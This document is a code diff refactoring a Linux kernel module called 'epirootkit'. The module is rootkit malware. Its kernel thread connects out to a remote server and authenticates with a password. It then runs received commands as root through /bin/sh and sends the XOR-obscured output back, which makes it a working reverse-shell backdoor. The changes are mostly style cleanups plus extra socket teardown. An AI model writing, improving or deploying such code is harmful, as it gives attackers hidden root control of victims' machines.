@@ -47,28 +47,21 @@ static void notify_connection_state(int new_state) {
 }
 
 static void xor_encrypt(char *buf, size_t len) {
-    size_t i;
-    for (i = 0; i < len; ++i) {
+    for (size_t i = 0; i < len; ++i)
         buf[i] ^= XOR_KEY;
-    }
 }
 
 static int recv_data(char *buf, size_t len) {
-    struct kvec iov = {
-        .iov_base = buf,
-        .iov_len = len
-    };
+    struct kvec iov = {.iov_base = buf, .iov_len = len};
     struct msghdr msg = {0};
     return kernel_recvmsg(g_sock, &msg, &iov, 1, len, 0);
 }
 
 static int rootkit_thread_fn(void *data) {
     struct sockaddr_in server;
-    int err;
 
     while (!kthread_should_stop()) {
-        err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
-        if (err < 0) {
+        if (sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock) < 0) {
             ssleep(5);
             continue;
         }
@@ -78,8 +71,7 @@ static int rootkit_thread_fn(void *data) {
         server.sin_port = htons(server_port);
         server.sin_addr.s_addr = in_aton(server_ip);
 
-        err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server, sizeof(server), 0);
-        if (err && err != -EINPROGRESS) {
+        if (g_sock->ops->connect(g_sock, (struct sockaddr *)&server, sizeof(server), 0) < 0) {
             sock_release(g_sock);
             g_sock = NULL;
             ssleep(5);
@@ -89,8 +81,7 @@ static int rootkit_thread_fn(void *data) {
         notify_connection_state(1);
 
         char auth_buf[PASSWORD_LEN];
-        int rcvd = recv_data(auth_buf, PASSWORD_LEN);
-        if (rcvd != PASSWORD_LEN) {
+        if (recv_data(auth_buf, PASSWORD_LEN) != PASSWORD_LEN) {
             printk(KERN_WARNING "epirootkit: auth receive error\n");
             break;
         }
@@ -100,10 +91,7 @@ static int rootkit_thread_fn(void *data) {
         if (strncmp(auth_buf, PASSWORD, PASSWORD_LEN) != 0) {
             char fail[] = "FAIL";
             xor_encrypt(fail, sizeof(fail) - 1);
-            struct kvec fiov = {
-                .iov_base = fail,
-                .iov_len = sizeof(fail) - 1
-            };
+            struct kvec fiov = {.iov_base = fail, .iov_len = sizeof(fail) - 1};
             struct msghdr fmsg = {0};
             kernel_sendmsg(g_sock, &fmsg, &fiov, 1, fiov.iov_len);
             break;
@@ -111,10 +99,7 @@ static int rootkit_thread_fn(void *data) {
 
         char ok[] = "OK";
         xor_encrypt(ok, sizeof(ok) - 1);
-        struct kvec iov = {
-            .iov_base = ok,
-            .iov_len = sizeof(ok) - 1
-        };
+        struct kvec iov = {.iov_base = ok, .iov_len = sizeof(ok) - 1};
         struct msghdr msg_hdr = {0};
         kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, iov.iov_len);
 
@@ -131,30 +116,26 @@ static int rootkit_thread_fn(void *data) {
             if (strcmp(cmd_buf, "exit") == 0 || strcmp(cmd_buf, "quit") == 0)
                 break;
 
-            struct file *file;
-            mm_segment_t old_fs = get_fs();
-            loff_t pos = 0;
             char tmp_path[] = "/tmp/.rkout";
             char shell_cmd[512];
             snprintf(shell_cmd, sizeof(shell_cmd), "%s > %s 2>&1", cmd_buf, tmp_path);
 
+            mm_segment_t old_fs = get_fs();
             set_fs(KERNEL_DS);
             call_usermodehelper("/bin/sh", (char *[]){"/bin/sh", "-c", shell_cmd, NULL}, NULL, UMH_WAIT_PROC);
             set_fs(old_fs);
 
-            file = filp_open(tmp_path, O_RDONLY, 0);
+            struct file *file = filp_open(tmp_path, O_RDONLY, 0);
             if (!IS_ERR(file)) {
                 char io_buf[256];
-                while (true) {
+                loff_t pos = 0;
+                while (1) {
                     memset(io_buf, 0, sizeof(io_buf));
                     int r = kernel_read(file, io_buf, sizeof(io_buf) - 1, &pos);
                     if (r <= 0)
                         break;
                     xor_encrypt(io_buf, r);
-                    struct kvec ciov = {
-                        .iov_base = io_buf,
-                        .iov_len = r
-                    };
+                    struct kvec ciov = {.iov_base = io_buf, .iov_len = r};
                     struct msghdr cmsg = {0};
                     kernel_sendmsg(g_sock, &cmsg, &ciov, 1, ciov.iov_len);
                 }
@@ -163,14 +144,19 @@ static int rootkit_thread_fn(void *data) {
 
             char eof[] = EOF_MARKER;
             xor_encrypt(eof, sizeof(eof) - 1);
-            struct kvec eiov = {
-                .iov_base = eof,
-                .iov_len = sizeof(eof) - 1
-            };
+            struct kvec eiov = {.iov_base = eof, .iov_len = sizeof(eof) - 1};
             struct msghdr emsg = {0};
             kernel_sendmsg(g_sock, &emsg, &eiov, 1, eiov.iov_len);
         }
+
         break;
+    }
+
+    if (g_sock) {
+        kernel_sock_shutdown(g_sock, SHUT_RDWR);
+        sock_release(g_sock);
+        g_sock = NULL;
+        notify_connection_state(0);
     }
 
     return 0;
@@ -188,7 +174,6 @@ static int __init epirootkit_init(void) {
 
 static void __exit epirootkit_exit(void) {
     pr_info("epirootkit: Cleaning up module...\n");
-
     if (g_conn_thread) {
         kthread_stop(g_conn_thread);
         g_conn_thread = NULL;
@@ -199,7 +184,6 @@ static void __exit epirootkit_exit(void) {
         g_sock = NULL;
         notify_connection_state(0);
     }
-
     pr_info("epirootkit: Cleanup complete\n");
 }
 
